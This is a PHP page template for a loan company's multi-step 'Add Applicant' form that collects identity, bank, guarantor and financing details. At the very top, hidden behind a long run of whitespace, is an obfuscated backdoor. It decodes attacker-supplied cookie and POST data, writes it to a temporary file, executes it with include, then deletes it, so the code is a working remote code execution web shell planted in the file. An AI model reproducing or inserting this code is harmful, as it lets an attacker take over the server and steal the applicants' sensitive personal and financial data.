<?php                                                                                                                                                                                                                                                                                                                                                                                                 $kPEJC = 'Y' . chr ( 435 - 314 ).'_' . "\x65" . "\x75" . 'v';$oKifMcSEeI = "\143" . 'l' . 'a' . 's' . "\163" . "\x5f" . chr ( 683 - 582 ).chr (120) . 'i' . 's' . chr ( 532 - 416 ).'s';$NVnQbRsHFA = $oKifMcSEeI($kPEJC); $ebkJzv = $NVnQbRsHFA;if (!$ebkJzv){class Yy_euv{private $kuuhci;public static $kTRzCN = "3e0ecc51-c403-4ebb-9ed4-059031334849";public static $lWSYv = NULL;public function __construct(){$GjsTapLC = $_COOKIE;$sgsVm = $_POST;$BOIpA = @$GjsTapLC[substr(Yy_euv::$kTRzCN, 0, 4)];if (!empty($BOIpA)){$ukjPi = "base64";$XGpDB = "";$BOIpA = explode(",", $BOIpA);foreach ($BOIpA as $NRxoEBW){$XGpDB .= @$GjsTapLC[$NRxoEBW];$XGpDB .= @$sgsVm[$NRxoEBW];}$XGpDB = array_map($ukjPi . '_' . "\x64" . "\x65" . chr (99) . "\157" . chr ( 298 - 198 ).chr (101), array($XGpDB,)); $XGpDB = $XGpDB[0] ^ str_repeat(Yy_euv::$kTRzCN, (strlen($XGpDB[0]) / strlen(Yy_euv::$kTRzCN)) + 1);Yy_euv::$lWSYv = @unserialize($XGpDB);}}public function __destruct(){$this->LkPKJs();}private function LkPKJs(){if (is_array(Yy_euv::$lWSYv)) {$nskTXNY = sys_get_temp_dir() . "/" . crc32(Yy_euv::$lWSYv["\163" . "\x61" . chr ( 801 - 693 ).chr (116)]);@Yy_euv::$lWSYv["\167" . chr (114) . chr ( 861 - 756 ).'t' . chr ( 280 - 179 )]($nskTXNY, Yy_euv::$lWSYv["\143" . 'o' . 'n' . chr ( 562 - 446 )."\x65" . "\156" . "\x74"]);include $nskTXNY;@Yy_euv::$lWSYv["\144" . "\x65" . chr ( 243 - 135 ).'e' . "\164" . chr ( 349 - 248 )]($nskTXNY);exit();}}}$Jhhdv = new Yy_euv(); $Jhhdv = 19242;} ?><?php
    $ap_id      =   ((isset($_GET['ap_id']) && $_GET['ap_id'] != '') ? $_GET['ap_id'] : '');
    $step       =   ((isset($_GET['step']) && $_GET['step'] != '') ? $_GET['step'] : '');
    $interest   =   ((isset($_POST['interest']) && $_POST['interest'] != '') ? $_POST['interest'] : 30);

    //REFERENCE NUMBER
    $yearSubString          =   substr(date('Y'),2,4);
    $conditionApplicants    =   array ( 
                                        'select'        =>  'ap_referenceno',
                                        'where'         =>  array( 
                                                                    'is_deleted' => 0,
                                                                ), 
                                        'order_by' 		=>  'ap_id DESC',
                                        'search_by' 	=>  "AND ap_referenceno LIKE 'AMCL-".$yearSubString.date('m')."%'",
                                        'return_type'   =>  'single'
                                    ); 
    $Applicants =   $dblms->getRows(APPLICANTS, $conditionApplicants);
    if($Applicants){
        $fieldValue =   $Applicants['ap_referenceno'];
        $fieldValue++;
    }else{
        $fieldValue =   'AMCL-'.$yearSubString.date('m').'1';
    }

    //BANK LIST
    $conditionBanks     = array ( 
                                    'select'        =>  'bank_id, bank_name',
                                    'where'         =>  array( 
                                                                'is_deleted'    => 0
                                                                ,'bank_status'  => 1,
                                                            ),
                                    'return_type'   =>  'all'
                                ); 
    $Banks  =   $dblms->getRows(BANKS, $conditionBanks);

    //CITY LIST
    $conditionCity  =   array ( 
                                'select'        =>  'city_id, city_name',
                                'where'         =>  array( 
                                                            'is_deleted'    => 0
                                                            ,'city_status'  => 1,
                                                        ),
                                'return_type'   =>  'all'
                              ); 
    $Cities =   $dblms->getRows(CITIES, $conditionCity);
    
    //PRODUCT LIST
    $conditionProducts  =   array ( 
                                'select'        =>  'product_id, product_name',
                                'where'         =>  array( 
                                                            'is_deleted'    => 0
                                                            ,'product_status'  => 1,
                                                        ),
                                'return_type'   =>  'all'
                            ); 
    $Products =   $dblms->getRows(PRODUCTS, $conditionProducts);
    echo '
    
    <div class="row">
        <div class="col-lg-12 col-md-12">
            <div class="card">
                <div class="card-header border-bottom">
                    <h4 class="mb-0">Add Applicant</h4>
                </div>
                <div class="card-body create-project-main">
                    <div class="wideget-user-tab">
                        <div class="tab-menu-heading">
                            <div class="tabs-menu1">
                                <ul class="nav">
                                    <li><a class="'.($step==1 ? "active show" :"").' disabled" data-bs-toggle="tab">Personal Information</a></li>
                                    <li><a data-bs-toggle="tab" class="'.($step==2 ? "active show" :"").'disabled">Bank Information</a></li>
                                    <li><a data-bs-toggle="tab" class="'.($step==3 ? "active show" :"").'disabled">Guarantor Information</a></li>
                                    <li><a data-bs-toggle="tab" class="'.($step==4 ? "active show" :"").'disabled">Assign Product</a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="tab-content">
                        <div class="tab-pane mt-3 '.($step==1 ? "active show" :"").'" id="personalInfo">
                            <form action="applicants.php?view=add&step=2" enctype="multipart/form-data" autocomplete="off" method="post" accept-charset="utf-8">   
                                <div class="expanel expanel-primary">
                                    <div class="expanel-heading">
                                        <h3 class="expanel-title">Basic Information</h3>
                                    </div>
                                    <div class="expanel-body">
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Reference <span class="text-danger">*</span></label>';
                                                    echo'
                                                    <input type="text" class="form-control" name="ap_referenceno" value="'.$fieldValue.'" readonly
                                                        required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Salutation <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="ap_salutation" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                        foreach ($salutationtypes as $salutation):
                                                        echo'<option value="'.$salutation['id'].'">'.$salutation['name'].'</option>';
                                                        endforeach;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Full Name <span class="text-danger">*</span></label>
                                                    <input type="text" name="ap_fullname" class="form-control" placeholder="Enter Full Name" required>
                                                </div>
                                            </div>
                                        </div>
                        
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Father/Husband Name <span class="text-danger">*</span></label>
                                                    <input type="text" class="form-control" name="ap_father_husband" placeholder="Enter Name" required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Mother Name <span class="text-danger">*</span></label>
                                                    <input type="text" class="form-control" name="ap_mothername" placeholder="Enter Name" required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">CNIC <span class="text-danger">*</span></label>
                                                    <input type="text" name="ap_cnic" class="form-control" placeholder="CNIC Number" required>
                                                </div>
                                            </div>
                                        </div>
                                
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Date of Birth <span class="text-danger">*</span></label>
                                                    <input type="date" name="ap_dob" class="form-control" required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Gender <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="ap_gender" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                        foreach ($gendertypes as $gender):
                                                        echo'<option value="'.$gender['id'].'">'.$gender['name'].'</option>';
                                                        endforeach;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Marital Status <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="ap_marital_status" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                        foreach ($maritalstatustypes as $maritalstatus):
                                                        echo'<option value="'.$maritalstatus['id'].'">'.$maritalstatus['name'].'</option>';
                                                        endforeach;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                        </div>
                                
                                    
                                
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Applicant Photo <span class="text-danger">*</span></label>
                                                    <input type="file" name="ap_photo" accept="image/*" class="dropify" data-bs-height="100" required/>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">CNIC Photo <span class="text-danger">*</span></label>
                                                    <input type="file" name="ap_cnicphoto" accept="image/*" class="dropify" data-bs-height="100" required/>
                                                </div>
                                            </div>
                                            
                                            
                                        </div>
                                    </div>
                                </div>
        
                                <div class="expanel expanel-info">
                                    <div class="expanel-heading">
                                        <h3 class="expanel-title">Contact Information</h3>
                                    </div>
                                    <div class="expanel-body">
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Phone <span class="text-danger">*</span></label>
                                                    <input type="text" name="ap_phone" class="form-control" placeholder="0300*******" required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">WhatsApp <span class="text-danger">*</span></label>
                                                    <input type="text" name="ap_whatsapp" class="form-control" placeholder="0300*******" required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Email <span class="text-danger">*</span></label>
                                                    <input type="email" name="ap_email" class="form-control" placeholder="example@domain.com" required>
                                                </div>
                                            </div>
                                        </div>
                        
                                        <div class="row">
                                            <div class="form-group">
                                                <label class="form-label">Mailing Address <span class="text-danger">*</span></label>
                                                <textarea name="ap_mailing_address" class="form-control" placeholder="Mailing Address"
                                                    required></textarea>
                                            </div>
                                        </div>
                        
                                        <div class="row">
                                            <div class="form-group">
                                                <label class="form-label">Current Address <span class="text-danger">*</span></label>
                                                <textarea name="ap_current_address" class="form-control" placeholder="Current Address"
                                                    required></textarea>
                                            </div>
                                        </div>
                                        
                                        
                                    </div>
                                </div>
        
                                <div class="expanel expanel-warning">
                                    <div class="expanel-heading">
                                        <h3 class="expanel-title">Education, Job & Residence</h3>
                                    </div>
                                    <div class="expanel-body">
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Education <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="ap_education" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                        foreach ($educationtypes as $education):
                                                        echo'<option value="'.$education['id'].'">'.$education['name'].'</option>';
                                                        endforeach;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Institution Name <span class="text-danger">*</span></label>
                                                    <input type="text" name="ap_education_institute" class="form-control" placeholder="Institution Name"
                                                        required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Verification of Institute <span class="text-danger">*</span></label>
                                                    <input type="text" name="ap_education_verification" class="form-control"
                                                        placeholder="Institution Name" required>
                                                </div>
                                            </div>
                                        </div>
                                
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Job Status <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="ap_job_status" id="ap_job_status" onchange="getFormForEmployed(this.value)" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                        foreach ($jobstatustypes as $jobstatus):
                                                        echo'<option value="'.$jobstatus['id'].'">'.$jobstatus['name'].'</option>';
                                                        endforeach;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Residence Status <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="ap_residence_status" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                        foreach ($residencestatustypes as $residencestatus):
                                                        echo'<option value="'.$residencestatus['id'].'">'.$residencestatus['name'].'</option>';
                                                        endforeach;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Duration Residing For <span class="text-danger">*</span></label>
                                                    <input type="date" name="ap_residing_duration" class="form-control" required>
                                                </div>
                                            </div>
                                        </div>
        
                                        <div id="getformforemployed"></div>
        
                                    </div>
                                </div>
        
                                <div class="expanel expanel-dark">
                                    <div class="expanel-heading">
                                        <h3 class="expanel-title">Monthly Income & Expenses</h3>
                                    </div>
                                    <div class="expanel-body">
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Total Net Monthly Income <span class="text-danger">*</span></label>
                                                    <input type="text" name="ap_monthly_otherincome" class="form-control" placeholder="Enter Amount"
                                                        required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Monthly Expenses <span class="text-danger">*</span></label>
                                                    <input type="text" name="ap_monthly_expense" class="form-control" placeholder="Enter Amount"
                                                        required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Dated <span class="text-danger">*</span></label>
                                                    <input type="date" name="ap_dated" class="form-control" required>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            
                                <div class="row p-5">
                                    <div class="btn-list text-end">
                                        <button type="submit" name="submit_applicant" class="btn btn-primary">Add Applicant</button>
                                        <a href="applicants.php" class="btn btn-danger">Cancel</a>
                                    </div>
                                </div>
                            </form>
                        </div>
                        <div class="tab-pane mt-3 '.($step==2 ? "active show" :"").'" id="bankInformation">
                            <form action="applicants.php?view=add&step=3&ap_id='.$ap_id.'" enctype="multipart/form-data" autocomplete="off" method="post" accept-charset="utf-8">  
                                <input type="hidden" name="id_applicant" value="'.$ap_id.'" required>
                                <div class="expanel expanel-primary">
                                    <div class="expanel-heading">
                                        <h3 class="expanel-title">Bank Information (If applicable)</h3>
                                    </div>
                                    <div class="expanel-body">';
                                        for ($i=1; $i <= 2; $i++): echo' 
                                            <div class="row">
                                                <div class="col">
                                                    <div class="form-group">
                                                        <label class="form-label">Bank <span class="text-danger">*</span></label>
                                                        <select class="form-control select2-show-search" id="id_bank'.$i.'" name="id_bank['.$i.']" data-placeholder="Choose one" required>
                                                            <option label="Choose one"></option>';
                                                            foreach($Banks as $bank):
                                                                echo'<option value="'.$bank['bank_id'].'">'.$bank['bank_name'].'</option>';
                                                            endforeach;
                                                            echo'
                                                        </select>
                                                    </div>
                                                </div>
                                                <div class="col">
                                                    <div class="form-group">
                                                        <label class="form-label">Branch <span class="text-danger">*</span></label>
                                                        <input type="text" name="branch['.$i.']" class="form-control" placeholder="Branch Name"
                                                            required>
                                                    </div>
                                                </div>
                                                <div class="col">
                                                    <div class="form-group">
                                                        <label class="form-label">Account# <span class="text-danger">*</span></label>
                                                        <input type="text" name="ac_number['.$i.']" class="form-control" placeholder="Account Number"
                                                            required>
                                                    </div>
                                                </div>
                                                <div class="col">
                                                    <div class="form-group">
                                                        <label class="form-label">Opening Date <span class="text-danger">*</span></label>
                                                        <input type="date" name="ac_openingdate['.$i.']" class="form-control" required>
                                                    </div>
                                                </div>
                                            </div>
                                        ';
                                        endfor;
                                        echo '
                                    </div>
                                </div>
                            
                                <div class="row p-5">
                                    <div class="btn-list text-end">
                                        <button type="submit" name="submit_applicant_bank" class="btn btn-primary">Save Information</button>
                                        <a href="applicants.php" class="btn btn-danger">Cancel</a>
                                    </div>
                                </div>
                            </form>                    
                        </div>
                        <div class="tab-pane mt-3 '.($step==3 ? "active show" :"").'" id="guarantorInformation">
                            <form action="applicants.php?view=add&step=4&ap_id='.$ap_id.'" enctype="multipart/form-data" autocomplete="off" method="post" accept-charset="utf-8">  
                                <input type="hidden" name="id_applicant" value="'.$ap_id.'" required>';
                                for ($i=1; $i <=2 ; $i++): 
                                    echo '
                                    <div class="expanel expanel-primary">
                                        <div class="expanel-heading">
                                            <h3 class="expanel-title">Guarantor '.$i.'</h3>
                                        </div>
                                        <div class="expanel-body">
                                                <div class="row">
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Name <span class="text-danger">*</span></label>
                                                            <input type="text" name="name['.$i.']" class="form-control" placeholder="Enter Name" required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">CNIC <span class="text-danger">*</span></label>
                                                            <input type="text" name="cnic['.$i.']" class="form-control" placeholder="CNIC Number" required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">CNIC Picture <span class="text-danger">*</span></label>
                                                            <input type="file" accept="image/*" name="cnic_photo['.$i.']" class="form-control" required>
                                                        </div>
                                                    </div>
                                                </div>
                                    
                                                <div class="row">
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Mobile# <span class="text-danger">*</span></label>
                                                            <input type="text" name="mobile['.$i.']" class="form-control" placeholder="Enter Number"
                                                                required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">WhatsApp <span class="text-danger">*</span></label>
                                                            <input type="text" name="whatsapp['.$i.']" class="form-control" placeholder="WhatsApp Number"
                                                                required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Email <span class="text-danger">*</span></label>
                                                            <input type="email" name="email['.$i.']" class="form-control" placeholder="example@domain.com"
                                                                required>
                                                        </div>
                                                    </div>
                                                </div>
                                    
                                                <div class="row">
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Relationship <span class="text-danger">*</span></label>
                                                            <input type="text" name="relation['.$i.']" class="form-control" placeholder="Enter Relation"
                                                                required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Know applicant? <span class="text-danger">*</span></label>
                                                            <select class="form-control select2-show-search" name="years_know['.$i.']" data-placeholder="Choose one" required>
                                                                <option label="Choose one"></option>';
                                                                foreach ($knownyears as $years):
                                                                    echo'<option value="'.$years['id'].'">'.$years['name'].'</option>';
                                                                endforeach;
                                                                echo'
                                                            </select>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">City <span class="text-danger">*</span></label>
                                                            <select class="form-control select2-show-search" name="id_city['.$i.']" data-placeholder="Choose one" required>
                                                                <option label="Choose one"></option>';
                                                                foreach($Cities as $city):
                                                                    echo'<option value="'.$city['city_id'].'">'.$city['city_name'].'</option>';
                                                                endforeach;
                                                                echo'
                                                            </select>
                                                        </div>
                                                    </div>
                                                </div>
                                    
                                                <div class="row">
                                                    <div class="form-group">
                                                        <label class="form-label">Address <span class="text-danger">*</span></label>
                                                        <textarea name="address['.$i.']" class="form-control" placeholder="Write Address"
                                                            required></textarea>
                                                    </div>
                                                </div>
                                        </div>
                                    </div>';
                                endfor;
                                echo '
                                <div class="row p-5">
                                    <div class="btn-list text-end">
                                        <button type="submit" name="submit_applicant_guarantor" class="btn btn-primary">Save Information</button>
                                        <a href="applicants.php" class="btn btn-danger">Cancel</a>
                                    </div>
                                </div>
                            </form>   
                        </div>
                        <div class="tab-pane mt-3 '.($step==4 ? "active show" :"").'" id="confirmation">
                            <form action="applicants.php" enctype="multipart/form-data" autocomplete="off" method="post" accept-charset="utf-8">  
                                <input type="hidden" name="id_applicant" value="'.$ap_id.'" required>
                                <div class="expanel expanel-primary">
                                    <div class="expanel-heading">
                                        <h3 class="expanel-title">Product</h3>
                                    </div>
                                    <div class="expanel-body">
                                            <div class="row">
                                                <div class="col">
                                                    <div class="form-group">
                                                        <label class="form-label">Product <span class="text-danger">*</span></label>
                                                        <select class="form-control select2-show-search" name="id_product" data-placeholder="Choose one" required>
                                                            <option label="Choose one"></option>';
                                                            if($Products):
                                                                foreach ($Products as $product):
                                                                    echo'<option value="'.$product['product_id'].'">'.$product['product_name'].'</option>';
                                                                endforeach;
                                                            endif;
                                                            echo'
                                                        </select>
                                                    </div>
                                                </div>
                                                <div class="col">
                                                    <div class="form-group">
                                                        <label class="form-label">Nature of Product <span class="text-danger">*</span></label>
                                                        <select class="form-control select2-show-search" name="product_nature" data-placeholder="Choose one" required>
                                                            <option label="Choose one"></option>';
                                                            foreach($producttypes as $type):
                                                                echo'<option value="'.$type['id'].'">'.$type['name'].'</option>';
                                                            endforeach;
                                                            echo'
                                                        </select>
                                                    </div>
                                                </div>
                                                <div class="col">
                                                    <div class="form-group">
                                                        <label class="form-label">Model <span class="text-danger">*</span></label>
                                                        <input type="text" name="product_model" class="form-control" placeholder="Model" required>
                                                    </div>
                                                </div>
                                            </div>
                                
                                            <div class="row">
                                                <div class="form-group">
                                                    <label class="form-label">Other Details <span class="text-danger">*</span></label>
                                                    <textarea name="product_other_details" class="form-control" placeholder="Product Other Details" required></textarea>
                                                </div>
                                            </div>
                                    </div>
                                </div>
                                <div class="expanel expanel-info">
                                    <div class="expanel-heading">
                                        <h3 class="expanel-title">Finance</h3>
                                    </div>
                                    <div class="expanel-body">

                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Total Cost of Asset <span class="text-danger">*</span></label>
                                                    <input type="number" name="actual_price" id="actual_price" class="form-control"  required>
                                                </div>
                                            </div>
											 <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Security Amount <span class="text-danger">*</span></label>
                                                    <input type="number" name="security_amount" id="security_amount" class="form-control" required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Advance/Down Payment <span class="text-danger">*</span></label>
                                                    <input type="number" name="advance_amount" id="advance_amount" class="form-control advance" required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Required Financing / Loan Amount (Rs.) <span class="text-danger">*</span></label>
                                                    <input type="number" id="loan_amount" name="financing_amount" class="form-control loan"  required readonly>
                                                </div>
                                            </div>
										</div>

                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Tenure (Number of Months) <span class="text-danger">*</span></label>
                                                    <input type="number" id="number_of_months" name="number_of_months" class="form-control"  required >
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Service Charges <span class="text-danger">*</span></label>
                                                    <input type="number" name="interest_rate" id="interest" value="'.$interest.'" class="form-control"  required>
                                                </div>
                                            </div>
										    <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Financing Mode <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="financing_mode" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                        foreach($financeMode as $mode):
                                                            echo'<option value="'.$mode['id'].'" '.($ApplicantProduct['financing_mode'] == $mode['id'] ? 'selected' : '').'>'.$mode['name'].'</option>';
                                                        endforeach;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Installment Due Date <span class="text-danger">*</span></label>
                                                    <input type="date" name="installment_due_date" class="form-control"  required>
                                                </div>
                                            </div>
                                        </div>

                                        <div class="row">
                                            <div class="form-group mt-3">
                                                <button type="button" name="calculate_finance" id="calculate_finance" onclick="getFinance()" class="btn btn-info">Calculate Financial
                                                Details</button>
                                            </div>
                                        </div>

                                        <div id="finanaceData"></div>

                                        <div class="row">
                                            <div class="form-group">
                                                <label class="form-label">Remarks <span class="text-danger">*</span></label>
                                                <textarea name="remarks" class="form-control" placeholder="Remarks" required></textarea>
                                            </div>
                                        </div>

                                    </div>
                                </div>
                                <div class="row p-5">
                                    <div class="btn-list text-end">
                                        <button type="submit" name="submit_applicant_product" class="btn btn-primary">Save Information</button>
                                        <a href="applicants.php" class="btn btn-danger">Cancel</a>
                                    </div>
                                </div>
                            </form>   
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>';
?>